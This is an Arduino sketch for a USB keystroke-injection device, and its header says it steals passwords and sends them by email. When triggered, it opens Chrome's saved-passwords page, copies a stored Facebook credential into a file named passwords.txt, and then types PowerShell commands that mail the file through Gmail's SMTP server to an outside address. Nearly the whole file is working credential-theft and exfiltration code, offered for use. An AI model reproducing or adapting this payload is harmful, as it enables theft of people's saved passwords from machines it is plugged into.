//--------------------------------------------------------------------
// -----This code steals the passwords and send that in email---------
// by Anishka Shukla--------------------------------------------------

#include "Keyboard.h"
#include "Mouse.h"

#define blinkInterval 50
#define ledPin 3
#define buttonPin 6

int defaultDelay = 4;
int defaultCharDelay = 5;
int rMin = 0;
int rMax = 100;

bool ledOn = true;

void typeKey(int key){
  Keyboard.press(key);
  delay(defaultCharDelay);
  Keyboard.release(key);
}

void setup(){
  
  pinMode(buttonPin, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  
  if(digitalRead(buttonPin) == LOW){
    
    Keyboard.begin();
    Mouse.begin();
    delay(2000);
    delay(defaultDelay);
    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(114);
    Keyboard.releaseAll();
    delay(defaultDelay);
    delay(1000);
    delay(defaultDelay);

    Keyboard.print("chrome");
    delay(defaultDelay);
    delay(1000);
    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    delay(4000);
    delay(defaultDelay);
    delay(defaultDelay);

    Keyboard.print("chrome://settings/passwords");
    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    delay(2000);
    delay(defaultDelay);
    Keyboard.print("facebook");
    delay(defaultDelay);
    delay(500);
    delay(defaultDelay);
    typeKey(KEY_TAB);
    delay(defaultDelay);
    delay(500);
    delay(defaultDelay);
    typeKey(KEY_DOWN_ARROW);

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    typeKey(KEY_TAB);

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    typeKey(KEY_TAB);

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(100);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    typeKey(KEY_TAB);

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    typeKey(KEY_TAB);

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    typeKey(KEY_TAB);

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(99);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(500);
    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(500);
    delay(defaultDelay);
    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(114);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(500);
    delay(defaultDelay);
    Keyboard.print("powershell start-process notepad.exe -Verb runAs");

    delay(defaultDelay);
    delay(500);
    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    delay(2000);
    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(121);
    Keyboard.releaseAll();
    delay(defaultDelay);
    delay(1000);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(118);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(500);
    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(102);
    Keyboard.releaseAll();
    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    Keyboard.print("s");
    delay(defaultDelay);
    delay(500);
    delay(defaultDelay);
    Keyboard.print("passwords.txt");
    delay(defaultDelay);
    delay(500);
    delay(defaultDelay);
    typeKey(KEY_TAB);
    for(int i = 0; i < 8; i++) {
      typeKey(KEY_TAB);
    }

    delay(defaultDelay);
    Keyboard.print("c");

    delay(defaultDelay);
    delay(1000);

    delay(defaultDelay);
    Keyboard.print("l");
    delay(defaultDelay);
    delay(500);
    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(115);
    Keyboard.releaseAll();
    delay(defaultDelay);
    delay(1000);
    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(500);
    delay(defaultDelay);
    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(114);
    Keyboard.releaseAll();
    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    Keyboard.print("powershell");
    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    delay(1000);
    delay(defaultDelay);
    Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("$SMTPInfo.EnableSsl = $true");
    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('youremail@gmail.com', 'password');");

    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    Keyboard.print("$ReportEmail.From = 'youremail@gmail.com'");

    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    Keyboard.print("$ReportEmail.To.Add('toemail@gmail.com')");
    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    Keyboard.print("$ReportEmail.Subject = 'Ducky chrome passwords'");

    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    Keyboard.print("$ReportEmail.Body = 'Attached is your list of passwords.'");
    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("$ReportEmail.Attachments.Add('c:\\passwords.txt')");
    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    Keyboard.print("$SMTPInfo.Send($ReportEmail)");

    delay(defaultDelay);
    typeKey(KEY_RETURN);
    delay(defaultDelay);
    delay(3000);
    delay(defaultDelay);
    Keyboard.print("exit");

    delay(defaultDelay);
    typeKey(KEY_RETURN);
    Keyboard.end();
  }
}

void loop(){
  ledOn = !ledOn;
  digitalWrite(ledPin, ledOn);
  delay(blinkInterval);
}